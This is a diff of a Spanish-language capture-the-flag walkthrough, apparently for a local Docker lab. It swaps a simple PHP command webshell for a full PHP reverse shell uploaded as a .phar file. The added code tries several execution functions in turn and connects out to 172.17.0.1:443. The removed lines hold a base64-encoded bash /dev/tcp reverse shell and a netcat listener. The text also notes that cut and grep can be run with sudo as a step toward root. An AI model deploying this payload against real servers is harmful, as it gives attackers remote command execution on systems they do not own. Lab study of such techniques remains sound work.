@@ -22,47 +22,129 @@ Intentamos subir un archivo que contenga código PHP para ejecutar comandos a ni
 
 Creamos un archivo llamado pwned.phar que incluye el siguiente código, lo cual nos permite ejecutar comandos del sistema al enviar un parámetro llamado cmd
 
-<?php
-    system($_GET'cmd');
-?>
+    /*<?php /**/
+      @error_reporting(0);@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);
+      $dis=@ini_get('disable_functions');
+      if(!empty($dis)){
+        $dis=preg_replace('/[, ]+/',',',$dis);
+        $dis=explode(',',$dis);
+        $dis=array_map('trim',$dis);
+      }else{
+        $dis=array();
+      }
+      
+    $ipaddr='172.17.0.1';
+    $port=443;
+
+    if(!function_exists('WrisYTZ')){
+      function WrisYTZ($c){
+        global $dis;
+        
+      if (FALSE !== stristr(PHP_OS, 'win' )) {
+        $c=$c." 2>&1\n";
+      }
+      $gPpr='is_callable';
+      $WEBa='in_array';
+      
+      if($gPpr('passthru')&&!$WEBa('passthru',$dis)){
+        ob_start();
+        passthru($c);
+        $o=ob_get_contents();
+        ob_end_clean();
+      }else
+      if($gPpr('system')&&!$WEBa('system',$dis)){
+        ob_start();
+        system($c);
+        $o=ob_get_contents();
+        ob_end_clean();
+      }else
+      if($gPpr('shell_exec')&&!$WEBa('shell_exec',$dis)){
+        $o=`$c`;
+      }else
+      if($gPpr('popen')&&!$WEBa('popen',$dis)){
+        $fp=popen($c,'r');
+        $o=NULL;
+        if(is_resource($fp)){
+          while(!feof($fp)){
+            $o.=fread($fp,1024);
+          }
+        }
+        @pclose($fp);
+      }else
+      if($gPpr('proc_open')&&!$WEBa('proc_open',$dis)){
+        $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
+        $o=NULL;
+        while(!feof($pipes[1])){
+          $o.=fread($pipes[1],1024);
+        }
+        @proc_close($handle);
+      }else
+      if($gPpr('exec')&&!$WEBa('exec',$dis)){
+        $o=array();
+        exec($c,$o);
+        $o=join(chr(10),$o).chr(10);
+      }else
+      {
+        $o=0;
+      }
+    
+        return $o;
+      }
+    }
+    $nofuncs='no exec functions';
+    if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){
+      $s=@fsockopen("tcp://172.17.0.1",$port);
+      while($c=fread($s,2048)){
+        $out = '';
+        if(substr($c,0,3) == 'cd '){
+          chdir(substr($c,3,-1));
+        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
+          break;
+        }else{
+          $out=WrisYTZ(substr($c,0,-1));
+          if($out===false){
+            fwrite($s,$nofuncs);
+            break;
+          }
+        }
+        fwrite($s,$out);
+      }
+      fclose($s);
+    }else{
+      $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
+      @socket_connect($s,$ipaddr,$port);
+      @socket_write($s,"socket_create");
+      while($c=@socket_read($s,2048)){
+        $out = '';
+        if(substr($c,0,3) == 'cd '){
+          chdir(substr($c,3,-1));
+        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
+          break;
+        }else{
+          $out=WrisYTZ(substr($c,0,-1));
+          if($out===false){
+            @socket_write($s,$nofuncs);
+            break;
+          }
+        }
+        @socket_write($s,$out,strlen($out));
+      }
+      @socket_close($s);
+}
 
 Subimos el archivo .phar y confirmaremos que se ha cargado correctamente
 
 172.17.0.2/upload.php
 
-si cargamos el archivo .phar y enviamos comandos a través del parámetro cmd, podremos ejecutar dichos comandos
-
 Ahora, necesitamos enviar una shell inversa a nuestra máquina atacante
 
-Primero, convertimos la shell inversa a Base64 utilizando el siguiente comando:
+En nuestra máquina atacante, nos ponemos a la escucha con Netcat en el puerto 443 utilizando el siguiente comando:
 
-echo "sh -i >& /dev/tcp/172.16.1.131/4444 0>&1" | base64
+nc -nvlp 443
 
-Esto nos da el siguiente resultado: c2ggLWkgPiYgL2Rldi90Y3AvMTcyLjE2LjEuMTMxLzQ0NDQgMD4mMQo=
-
-En nuestra máquina atacante, nos ponemos a la escucha con Netcat en el puerto 4444 utilizando el siguiente comando:
-
-nc -nvlp 4444
-
-Luego, en el parámetro cmd, enviamos el siguiente comando:
-
-echo "c2ggLWkgPiYgL2Rldi90Y3AvMTcyLjE2LjEuMTMxLzQ0NDQgMD4mMQo=" | base64 -d | bash
+hacemos click en el archivo para abrirlo
 
 Al ejecutar esto, obtendremos una shell inversa en nuestra máquina atacante. Así, estaremos dentro del sistema
-
-Tratamiento de la TTY
-
-Una vez estemos dentro ejecutamos el siguiente comando: script /dev/null -c bash
-
-Luego presionamos: Ctrl + Z para suspender el proceso
-
-A continuación, escribimos: stty raw -echo; fg
-
-Despues ingresamos: reset
-
-Cuando se nos pregunte: "Terminal type?" Ingresamos xterm.
-
-Finalmente, exportamos las siguientes variables de entorno: export TERM=xterm export SHELL=bash
 
 Al ejecutar sudo -l, veremos que podemos ejecutar los binarios /usr/bin/cut y /usr/bin/grep como usuario root sin necesidad de proporcionar una contraseña
 
